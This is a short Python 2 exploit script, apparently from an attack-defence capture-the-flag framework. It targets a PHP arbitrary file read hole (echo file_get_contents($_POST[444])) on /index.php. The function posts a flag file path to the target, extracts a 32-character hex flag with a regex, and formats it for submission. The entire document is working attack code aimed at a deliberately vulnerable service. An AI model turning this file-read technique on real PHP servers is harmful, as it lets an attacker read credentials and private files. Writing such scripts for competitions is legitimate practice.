#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    echo file_get_contents($_POST[444]);

    '''
    import re

    try:
        cmd = flag_path
        data = '444=%s'% quote(cmd) 
        res = http("post",target,target_port,"/index.php",data,headers)
        # Even though we can not execute the cmd with the vuln, but we can read flag
        # and we want to use our framework to carry out this attack
        # not do the replicate tasks to code a new script
        flag_pattern = '([0-9a-fA-F]){32}'
        tmp = re.search(flag_pattern,res)
        if tmp:
            res = tmp.group()
            res = cmd_prefix + res + cmd_postfix
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




